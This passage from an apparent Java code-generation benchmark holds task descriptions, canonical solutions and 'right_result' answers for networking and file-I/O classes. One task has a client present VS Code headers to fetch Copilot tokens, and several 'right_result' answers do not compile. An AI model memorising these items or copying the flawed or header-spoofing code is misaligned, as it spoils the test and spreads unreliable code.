(isClassAvailable(\"io.netty.channel.kqueue.KQueueEventLoopGroup\")) {\n            return new Transport(io.netty.channel.kqueue.KQueueServerSocketChannel.class, () -> new io.netty.channel.kqueue.KQueueEventLoopGroup());\n        } else if (isClassAvailable(\"io.netty.incubator.channel.uring.IOUringEventLoopGroup\")) {\n            return new Transport(io.netty.incubator.channel.uring.IOUringServerSocketChannel.class, () -> new io.netty.incubator.channel.uring.IOUringEventLoopGroup());\n        } else {\n            return new Transport(NioServerSocketChannel.class, () -> new NioEventLoopGroup());\n        }\n    }\n\n    private static boolean isClassAvailable(String className) {\n        try {\n            Class.forName(className);\n            return true;\n        } catch (ClassNotFoundException e) {\n            return false;\n        }\n    }\n\n    public record Transport(Class<? extends Channel> channelClass, EventLoopGroupFactory eventLoopGroupFactory) {}\n}\n```"
  },
  {
    "Task_id": 236,
    "Instruction": "Task Description: Create a Java class that implements a UDP client using Netty framework for sending and receiving datagram packets. The client should be able to start a connection, send messages to a specified host and port, handle console input for sending messages, and gracefully shutdown the connection.\n\nClass Description: DatagramChannelEchoClient is a Netty-based UDP client that establishes a connection to a specified host and port, sends messages via UDP datagrams, and can be controlled through console input. It manages network resources efficiently and provides clean shutdown capabilities.\n\nAttributes:\n- host: String - The target host address to which messages will be sent\n- port: int - The target port number on the host\n- group: EventLoopGroup - Netty event loop group for handling I/O operations\n- channel: Channel - The Netty channel used for UDP communication\n\nMethods:\n- DatagramChannelEchoClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Starts the UDP client by initializing Netty components and binding to the port\n- sendMessage(String message) -> void - Sends a message to the configured host and port via UDP\n- stop() -> void - Gracefully shuts down the client and releases resources\n- runConsoleInput() -> void - Reads input from console and sends it as messages until terminated",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\n\npublic final class DatagramChannelEchoClient {\n\n    private final String host;\n    private final int port;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public DatagramChannelEchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioDatagramChannel.class)\n         .option(ChannelOption.SO_BROADCAST, true)\n         .handler(new DatagramChannelEchoClientHandler());\n\n        ChannelFuture f = b.bind(port).sync();\n        channel = f.channel();\n        System.out.println(\"DatagramChannelEchoClient\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n    }\n\n    public void sendMessage(String message) throws IOException {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        io.netty.buffer.ByteBuf buf = io.netty.buffer.Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(new io.netty.channel.socket.DatagramPacket(\n            buf, new InetSocketAddress(host, port)));\n        writeBuffer.clear();\n    }\n\n    public void stop() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void runConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + host);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + host);\n            System.exit(1);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramPacket;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class DatagramChannelEchoClient {\n    private final String host;\n    private final int port;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public DatagramChannelEchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioDatagramChannel.class)\n         .option(ChannelOption.SO_BROADCAST, true)\n         .handler(new ChannelInitializer<Channel>() {\n             @Override\n             protected void initChannel(Channel ch) throws Exception {\n                 ch.pipeline().addLast(new SimpleChannelInboundHandler<DatagramPacket>() {\n                     @Override\n                     protected void channelRead0(ChannelHandlerContext ctx, DatagramPacket msg) throws Exception {\n                         ByteBuf content = msg.content();\n                         System.out.println(\"Received response: \" + content.toString(io.netty.util.CharsetUtil.UTF_8));\n                     }\n                 });\n             }\n         });\n\n        channel = b.bind(0).sync().channel();\n    }\n\n    public void sendMessage(String message) throws Exception {\n        channel.writeAndFlush(new DatagramPacket(Unpooled.copiedBuffer(message, io.netty.util.CharsetUtil.UTF_8), new InetSocketAddress(host, port))).sync();\n    }\n\n    public void stop() throws InterruptedException {\n        channel.closeFuture().sync();\n        group.shutdownGracefully();\n    }\n\n    public void runConsoleInput() throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        while (true) {\n            System.out.print(\"Enter message to send: \");\n            String line = reader.readLine();\n            if (\"exit\".equalsIgnoreCase(line)) break;\n            sendMessage(line);\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length != 2) {\n            System.err.println(\"Usage: java DatagramChannelEchoClient <host> <port>\");\n            return;\n        }\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n\n        DatagramChannelEchoClient client = new DatagramChannelEchoClient(host, port);\n        client.start();\n        client.runConsoleInput();\n        client.stop();\n    }\n}\n```"
  },
  {
    "Task_id": 237,
    "Instruction": "Task Description: Create a utility class for retrieving Discord guild widget information using HTTP requests.\n\nClass Description: WidgetUtil is a utility class that provides functionality to fetch Discord guild widget data through REST API calls. It handles HTTP communication, response processing, and error handling for widget retrieval operations.\n\nAttributes:\nWIDGET_URL: [String] - The URL template for accessing Discord guild widget JSON data, using the default REST API base URL.\n\nMethods:\ngetWidget: [getWidget]([long guildId]) -> [Widget] - Retrieves the widget information for a specified Discord guild ID. Handles various HTTP response codes including success (200), not found (404), forbidden (403), and rate limiting (429). Throws RateLimitedException when rate limited and UncheckedIOException for IO errors. Returns null if the widget doesn't exist or is inaccessible.",
    "Canonical_solution": "import net.dv8tion.jda.api.entities.Widget;\nimport net.dv8tion.jda.api.exceptions.RateLimitedException;\nimport net.dv8tion.jda.api.requests.RestConfig;\nimport net.dv8tion.jda.api.utils.data.DataObject;\nimport net.dv8tion.jda.internal.entities.WidgetImpl;\nimport net.dv8tion.jda.internal.utils.Checks;\nimport net.dv8tion.jda.internal.utils.IOUtil;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\n\nimport javax.annotation.Nonnull;\nimport javax.annotation.Nullable;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.UncheckedIOException;\n\npublic class WidgetUtil \n{\n    public static final String WIDGET_URL = RestConfig.DEFAULT_BASE_URL + \"guilds/%s/widget.json\";\n\n    @Nullable\n    public static Widget getWidget(long guildId) throws RateLimitedException\n    {\n        Checks.notNull(guildId, \"GuildId\");\n\n        OkHttpClient client = new OkHttpClient.Builder().build();\n        Request request = new Request.Builder()\n                    .url(String.format(WIDGET_URL, guildId))\n                    .method(\"GET\", null)\n                    .header(\"user-agent\", RestConfig.USER_AGENT)\n                    .header(\"accept-encoding\", \"gzip\")\n                    .build();\n\n        try (Response response = client.newCall(request).execute())\n        {\n            final int code = response.code();\n            InputStream data = IOUtil.getBody(response);\n\n            switch (code)\n            {\n                case 200:\n                    try (InputStream stream = data)\n                    {\n                        return new WidgetImpl(DataObject.fromJson(stream));\n                    }\n                    catch (IOException e)\n                    {\n                        throw new UncheckedIOException(e);\n                    }\n                case 400:\n                case 404:\n                    return null;\n                case 403:\n                    return new WidgetImpl(guildId);\n                case 429:\n                    long retryAfter;\n                    try (InputStream stream = data)\n                    {\n                        retryAfter = DataObject.fromJson(stream).getLong(\"retry_after\");\n                    }\n                    catch (Exception e)\n                    {\n                        retryAfter = 0;\n                    }\n                    throw new RateLimitedException(WIDGET_URL, retryAfter);\n                default:\n                    throw new IllegalStateException(\"An unknown status was returned: \" + code + \" \" + response.message());\n            }\n        }\n        catch (IOException e)\n        {\n            throw new UncheckedIOException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.concurrent.CompletableFuture;\n\npublic class WidgetUtil {\n\n    private static final String WIDGET_URL = \"https://discord.com/api/guilds/%d/widget.json\";\n\n    public static Widget getWidget(long guildId) throws IOException, InterruptedException {\n        HttpClient client = HttpClient.newHttpClient();\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(String.format(WIDGET_URL, guildId)))\n                .header(\"User-Agent\", \"DiscordBot\")\n                .build();\n\n        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());\n\n        switch (response.statusCode()) {\n            case 200:\n                return parseWidget(response.body());\n            case 404:\n                return null;\n            case 403:\n                throw new ForbiddenException(\"Forbidden access to widget\");\n            case 429:\n                throw new RateLimitedException(\"Rate limit exceeded\");\n            default:\n                throw new IOException(\"Unexpected status code: \" + response.statusCode());\n        }\n    }\n\n    private static Widget parseWidget(String responseBody) {\n        // Implement parsing logic here\n        return new Widget(); // Placeholder return\n    }\n\n    public static class Widget {\n        // Define widget properties and methods\n    }\n\n    public static class RateLimitedException extends RuntimeException {\n        public RateLimitedException(String message) {\n            super(message);\n        }\n    }\n\n    public static class ForbiddenException extends RuntimeException {\n        public ForbiddenException(String message) {\n            super(message);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 24,
    "Instruction": "Task Description: Create a Java class that provides file processing capabilities using Java NIO's FileChannel for efficient file operations including memory-mapped file access and direct buffer reading.\n\nClass Description: FileChannelProcessor is a utility class that handles file operations using Java NIO's FileChannel. It supports memory-mapped file access (MappedByteBuffer) and direct buffer reading (ByteBuffer) with methods for opening/closing channels, mapping file segments, reading buffer segments, and finding line boundaries in buffers.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nfilePath: Path - The path to the file being processed\nMAX_LINE_LENGTH: int (static final) - Maximum expected line length for boundary finding\nMMAP_CHUNK_SIZE: int (static final) - Maximum size for memory-mapped file segments\n\nMethods:\nopenChannel: void() throws IOException - Opens a read-only FileChannel for the specified file path\nmapFileSegment: MappedByteBuffer(long start, long size) throws IOException - Maps a file segment into memory as a read-only MappedByteBuffer\nreadBufferSegment: ByteBuffer(long position, int length) throws IOException - Reads a file segment into a direct ByteBuffer\nfindLineBoundary: long(ByteBuffer buffer, long startPosition) - Finds the position of the next line boundary in a buffer\ncloseChannel: void() throws IOException - Closes the FileChannel if it's open\ngetFileSize: long() throws IOException - Returns the size of the file associated with the FileChannel",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private static final int MAX_LINE_LENGTH = 128;\n    private static final int MMAP_CHUNK_SIZE = Integer.MAX_VALUE / 32;\n\n    private FileChannel fileChannel;\n    private Path filePath;\n\n    public FileChannelProcessor(Path filePath) {\n        this.filePath = filePath;\n    }\n\n    public void openChannel() throws IOException {\n        this.fileChannel = FileChannel.open(filePath, StandardOpenOption.READ);\n    }\n\n    public MappedByteBuffer mapFileSegment(long start, long size) throws IOException {\n        return fileChannel.map(FileChannel.MapMode.READ_ONLY, start, size);\n    }\n\n    public ByteBuffer readBufferSegment(long position, int length) throws IOException {\n        ByteBuffer buf = ByteBuffer.allocateDirect(length);\n        fileChannel.read(buf, position);\n        return buf;\n    }\n\n    public long findLineBoundary(ByteBuffer buffer, long startPosition) {\n        int w = MAX_LINE_LENGTH;\n        while (buffer.get(w - 1) != '\\n') {\n            w--;\n        }\n        return startPosition + w;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public long getFileSize() throws IOException {\n        return fileChannel.size();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private Path filePath;\n    public static final int MAX_LINE_LENGTH = 1024;\n    public static final int MMAP_CHUNK_SIZE = 1024 * 1024; // 1MB\n\n    public void openChannel(String filePath) throws IOException {\n        this.filePath = Paths.get(filePath);\n        this.fileChannel = FileChannel.open(this.filePath, StandardOpenOption.READ);\n    }\n\n    public MappedByteBuffer mapFileSegment(long start, long size) throws IOException {\n        return fileChannel.map(FileChannel.MapMode.READ_ONLY, start, size);\n    }\n\n    public ByteBuffer readBufferSegment(long position, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocateDirect(length);\n        fileChannel.read(buffer, position);\n        buffer.flip();\n        return buffer;\n    }\n\n    public long findLineBoundary(ByteBuffer buffer, long startPosition) {\n        for (int i = 0; i < buffer.limit(); i++) {\n            if (buffer.get(startPosition + i) == '\\n') {\n                return startPosition + i + 1;\n            }\n        }\n        return -1;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null && fileChannel.isOpen()) {\n            fileChannel.close();\n        }\n    }\n\n    public long getFileSize() throws IOException {\n        return fileChannel.size();\n    }\n}\n```"
  },
  {
    "Task_id": 245,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for interacting with GitHub Copilot and CoCoPilot services, including token retrieval and request execution capabilities.\n\nClass Description: The ApiClient class provides functionality to interact with GitHub Copilot and CoCoPilot APIs. It handles HTTP requests, manages headers, and processes responses. The class maintains a reusable HTTP client with configurable timeouts and generates unique identifiers for tracking requests.\n\nAttributes:\n- client: OkHttpClient - The HTTP client instance used for making requests\n- machineId: String - A unique identifier generated for the machine (static final)\n\nMethods:\n- ApiClient() -> None - Constructor that initializes the HTTP client with timeout configurations\n- generateMachineId() -> String - Generates a unique machine identifier using UUID (private static)\n- getCopilotToken(String apiKey) -> String - Retrieves a Copilot token using the provided API key\n- getCoCoToken(String apiKey) -> String - Retrieves a CoCoPilot token using the provided API key\n- executeRequest(String url, String method, String body, Map<String, String> headers) -> Response - Executes a generic HTTP request with specified parameters\n- createHeaders(String chatToken) -> Map<String, String> - Creates a standard set of headers for API requests using the provided chat token",
    "Canonical_solution": "import com.alibaba.fastjson2.JSON;\nimport okhttp3.*;\nimport org.json.JSONException;\nimport org.json.JSONObject;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\n\npublic class ApiClient {\n    private final OkHttpClient client;\n    private static final String machineId = generateMachineId();\n\n    public ApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(3, TimeUnit.MINUTES)\n                .readTimeout(5, TimeUnit.MINUTES)\n                .writeTimeout(5, TimeUnit.MINUTES)\n                .build();\n    }\n\n    private static String generateMachineId() {\n        return UUID.randomUUID().toString();\n    }\n\n    public String getCopilotToken(String apiKey) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/copilot_internal/v2/token\")\n                .addHeader(\"Host\", \"api.github.com\")\n                .addHeader(\"authorization\", \"token \" + apiKey)\n                .addHeader(\"Editor-Version\", \"vscode/1.85.0\")\n                .addHeader(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\")\n                .addHeader(\"User-Agent\", \"GitHubCopilotChat/0.11.1\")\n                .addHeader(\"Accept\", \"*/*\")\n                .build();\n        \n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                return null;\n            }\n            String responseBody = response.body().string();\n            JSONObject jsonResponse = new JSONObject(responseBody);\n            return jsonResponse.has(\"token\") ? jsonResponse.get(\"token\").toString() : null;\n        } catch (JSONException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String getCoCoToken(String apiKey) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.cocopilot.org/copilot_internal/v2/token\")\n                .addHeader(\"Host\", \"api.cocopilot.org\")\n                .addHeader(\"authorization\", \"token \" + apiKey)\n                .addHeader(\"Editor-Version\", \"vscode/1.85.0\")\n                .addHeader(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\")\n                .addHeader(\"User-Agent\", \"GitHubCopilotChat/0.11.1\")\n                .addHeader(\"Accept\", \"*/*\")\n                .build();\n        \n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                return null;\n            }\n            String responseBody = response.body().string();\n            JSONObject jsonResponse = new JSONObject(responseBody);\n            return jsonResponse.has(\"token\") ? jsonResponse.get(\"token\").toString() : null;\n        } catch (JSONException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public Response executeRequest(String url, String method, String body, Map<String, String> headers) throws IOException {\n        MediaType JSON = MediaType.get(\"application/json; charset=utf-8\");\n        RequestBody requestBody = RequestBody.create(body, JSON);\n        \n        Request.Builder requestBuilder = new Request.Builder()\n                .url(url);\n        \n        if (\"POST\".equalsIgnoreCase(method)) {\n            requestBuilder.post(requestBody);\n        } else if (\"GET\".equalsIgnoreCase(method)) {\n            requestBuilder.get();\n        }\n        \n        headers.forEach(requestBuilder::addHeader);\n        Request request = requestBuilder.build();\n        \n        return client.newCall(request).execute();\n    }\n\n    public Map<String, String> createHeaders(String chatToken) {\n        Map<String, String> headersMap = new HashMap<>();\n        headersMap.put(\"Host\", \"api.githubcopilot.com\");\n        headersMap.put(\"Accept-Encoding\", \"gzip, deflate, br\");\n        headersMap.put(\"Accept\", \"*/*\");\n        headersMap.put(\"Authorization\", \"Bearer \" + chatToken);\n        headersMap.put(\"X-Request-Id\", UUID.randomUUID().toString());\n        headersMap.put(\"X-Github-Api-Version\", \"2023-07-07\");\n        headersMap.put(\"Vscode-Sessionid\", UUID.randomUUID().toString() + System.currentTimeMillis());\n        headersMap.put(\"vscode-machineid\", machineId);\n        headersMap.put(\"Editor-Version\", \"vscode/1.85.0\");\n        headersMap.put(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\");\n        headersMap.put(\"Openai-Organization\", \"github-copilot\");\n        headersMap.put(\"Copilot-Integration-Id\", \"vscode-chat\");\n        headersMap.put(\"Openai-Intent\", \"conversation-panel\");\n        headersMap.put(\"User-Agent\", \"GitHubCopilotChat/0.11.1\");\n        return headersMap;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport okhttp3.*;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\n\npublic class ApiClient {\n    private final OkHttpClient client = new OkHttpClient.Builder()\n            .connectTimeout(10, TimeUnit.SECONDS)\n            .readTimeout(10, TimeUnit.SECONDS)\n            .writeTimeout(10, TimeUnit.SECONDS)\n            .build();\n    private static final String machineId = generateMachineId();\n\n    public ApiClient() {}\n\n    private static String generateMachineId() {\n        return UUID.randomUUID().toString();\n    }\n\n    public String getCopilotToken(String apiKey) throws IOException {\n        RequestBody requestBody = RequestBody.create(\"{\\\"apiKey\\\":\\\"\" + apiKey + \"\\\"}\", MediaType.get(\"application/json\"));\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/copilot/token\")\n                .post(requestBody)\n                .addHeader(\"Content-Type\", \"application/json\")\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n            return response.body().string();\n        }\n    }\n\n    public String getCoCoToken(String apiKey) throws IOException {\n        RequestBody requestBody = RequestBody.create(\"{\\\"apiKey\\\":\\\"\" + apiKey + \"\\\"}\", MediaType.get(\"application/json\"));\n        Request request = new Request.Builder()\n                .url(\"https://api.cocopilot.com/token\")\n                .post(requestBody)\n                .addHeader(\"Content-Type\", \"application/json\")\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n            return response.body().string();\n        }\n    }\n\n    public Response executeRequest(String url, String method, String body, Map<String, String> headers) throws IOException {\n        RequestBody requestBody = body != null ? RequestBody.create(body, MediaType.parse(\"application/json\")) : null;\n        Request.Builder builder = new Request.Builder()\n                .url(url)\n                .method(method, requestBody);\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                builder.addHeader(entry.getKey(), entry.getValue());\n            }\n        }\n        return client.newCall(builder.build()).execute();\n    }\n\n    public Map<String, String> createHeaders(String chatToken) {\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Authorization\", \"Bearer \" + chatToken);\n        headers.put(\"User-Agent\", \"ApiClient/\" + machineId);\n        return headers;\n    }\n}\n```"
  },
  {
    "Task_id": 246,
    "Instruction": "Task Description: Create a Java class that provides HTTP client functionality for making POST requests and JSON requests to RESTful APIs, with support for both JSON and form-data payloads, and proper response handling.\n\nClass Description: The Network class is a utility class that encapsulates HTTP client operations for interacting with RESTful APIs. It provides methods for making POST requests with flexible parameter formats (JSON or form-data) and a specialized method for making requests that expect JSON responses.\n\nAttributes:\n\nhttpClient: [HttpClient] - A shared HTTP client instance used for all requests, initialized as a static final variable to ensure thread-safety and reuse.\n\nMethods:\n\nmakePOSTRequest: [Name](String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParamtersToJSON) -> [HttpResponse<String>] - Makes a POST request to the specified URL with the given parameters and headers. The convertParamtersToJSON flag determines whether parameters are sent as JSON or form-urlencoded data.\n\nbuildFormDataFromMap: [Name](Map<Object, Object> data) -> [HttpRequest.BodyPublisher] - A private helper method that converts a Map into form-urlencoded string format for POST requests.\n\nmakeJsonRequest: [Name](String url) -> [JsonElement] - Makes a GET request to the specified URL and parses the response as JSON, throwing an IOException if the request fails.\n\nfailure: [Name](int statusCode) -> [boolean] - A private helper method that checks if an HTTP status code indicates failure (outside 200-299 range).",
    "Canonical_solution": "import com.google.gson.Gson;\nimport com.google.gson.JsonElement;\nimport com.google.gson.JsonParser;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\n\npublic class Network {\n\n    private static final HttpClient httpClient = HttpClient.newHttpClient();\n\n    public static HttpResponse<String> makePOSTRequest(String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParamtersToJSON) throws IOException, InterruptedException {\n        Gson gson = new Gson();\n        String JSONParameters = gson.toJson(parameters);\n\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder(URI.create(url))\n                .POST(convertParamtersToJSON ? BodyPublishers.ofString(JSONParameters) : buildFormDataFromMap(parameters));\n\n        for (Map.Entry<String, String> entry : headers.entrySet())\n            requestBuilder.header(entry.getKey(), entry.getValue());\n\n        HttpRequest request = requestBuilder.build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    private static HttpRequest.BodyPublisher buildFormDataFromMap(Map<Object, Object> data) {\n        var builder = new StringBuilder();\n        for (Map.Entry<Object, Object> entry : data.entrySet()) {\n            if (builder.length() > 0) {\n                builder.append(\"&\");\n            }\n            builder.append(URLEncoder.encode(entry.getKey().toString(), StandardCharsets.UTF_8));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(entry.getValue().toString(), StandardCharsets.UTF_8));\n        }\n        return HttpRequest.BodyPublishers.ofString(builder.toString());\n    }\n\n    static JsonElement makeJsonRequest(String url) throws IOException {\n        try {\n            HttpResponse<InputStream> response = httpClient.send(HttpRequest.newBuilder(URI.create(url)).build(),\n                    HttpResponse.BodyHandlers.ofInputStream());\n            if (failure(response.statusCode())) {\n                throw new IOException(\"HTTP Response was \" + response);\n            }\n            return JsonParser.parseReader(new BufferedReader(new InputStreamReader(response.body())));\n        } catch (InterruptedException e) {\n            throw new IOException(e);\n        }\n    }\n\n    private static boolean failure(int statusCode) {\n        return statusCode < 200 || statusCode > 299;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Map;\nimport org.json.JsonElement;\nimport org.json.JsonParser;\n\npublic class Network {\n    private static final HttpClient httpClient = HttpClient.newHttpClient();\n\n    public HttpResponse<String> makePOSTRequest(String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParamtersToJSON) throws IOException, InterruptedException {\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .headers(headers.entrySet().stream().flatMap(entry -> Stream.of(entry.getKey(), entry.getValue())).toArray(String[]::new));\n\n        if (convertParamtersToJSON) {\n            String jsonPayload = new Gson().toJson(parameters);\n            requestBuilder.POST(HttpRequest.BodyPublishers.ofString(jsonPayload))\n                    .header(\"Content-Type\", \"application/json\");\n        } else {\n            HttpRequest.BodyPublisher bodyPublisher = buildFormDataFromMap(parameters);\n            requestBuilder.POST(bodyPublisher)\n                    .header(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        }\n\n        return httpClient.send(requestBuilder.build(), HttpResponse.BodyHandlers.ofString());\n    }\n\n    private HttpRequest.BodyPublisher buildFormDataFromMap(Map<Object, Object> data) {\n        StringBuilder sb = new StringBuilder();\n        data.forEach((key, value) -> {\n            if (sb.length() > 0) sb.append('&');\n            sb.append(URLEncoder.encode(key.toString(), StandardCharsets.UTF_8));\n            sb.append('=');\n            sb.append(URLEncoder.encode(value.toString(), StandardCharsets.UTF_8));\n        });\n        return HttpRequest.BodyPublishers.ofString(sb.toString());\n    }\n\n    public JsonElement makeJsonRequest(String url) throws IOException, InterruptedException {\n        HttpResponse<String> response = httpClient.send(HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .GET()\n                .build(), HttpResponse.BodyHandlers.ofString());\n\n        if (failure(response.statusCode())) {\n            throw new IOException(\"HTTP Request failed with status code: \" + response.statusCode());\n        }\n\n        return JsonParser.parseString(response.body());\n    }\n\n    private boolean failure(int statusCode) {\n        return statusCode < 200 || statusCode >= 300;\n    }\n}\n```"
  },
  {
    "Task_id": 247,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests to a RESTful API using the OkHttp client library, with support for both GET and POST methods, including timeout configuration and proper resource cleanup.\n\nClass Description: GHMatrixBatchRequester is a utility class designed to make HTTP requests to a GraphHopper matrix API. It provides methods for sending GET and POST requests, handles response processing, and includes timeout configurations for network operations.\n\nAttributes:\n- logger: Logger - Used for logging debug and error information\n- client: OkHttpClient - The HTTP client instance used to make requests\n\nMethods:\n- Constructor: GHMatrixBatchRequester() -> void - Initializes the HTTP client with default timeout settings (5 seconds for connect and read)\n- Constructor: GHMatrixBatchRequester(OkHttpClient) -> void - Allows injection of a custom configured OkHttpClient instance\n- getJson: getJson(String url) -> JsonResult - Sends a GET request to the specified URL and returns the response as a JsonResult object containing the response body, status code, and headers\n- postJson: postJson(String url, JsonNode requestJson) -> JsonResult - Sends a POST request with JSON payload to the specified URL and returns the response as a JsonResult object containing the response body, status code, and headers",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.net.SocketTimeoutException;\nimport java.util.concurrent.TimeUnit;\n\nimport static com.graphhopper.api.GraphHopperWeb.X_GH_CLIENT_VERSION;\nimport static com.graphhopper.api.Version.GH_VERSION_FROM_MAVEN;\n\npublic class GHMatrixBatchRequester {\n\n    private final Logger logger = LoggerFactory.getLogger(getClass());\n    private OkHttpClient client;\n\n    public GHMatrixBatchRequester() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(5, TimeUnit.SECONDS)\n                .readTimeout(5, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public GHMatrixBatchRequester(OkHttpClient client) {\n        this.client = client;\n    }\n\n    protected JsonResult getJson(String url) throws IOException {\n        Request okRequest = new Request.Builder().url(url)\n                .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                .build();\n        ResponseBody body = null;\n        try {\n            Response rsp = client.newCall(okRequest).execute();\n            body = rsp.body();\n            return new JsonResult(body.string(), rsp.code(), rsp.headers().toMultimap());\n        } finally {\n            if (body != null) {\n                body.close();\n            }\n        }\n    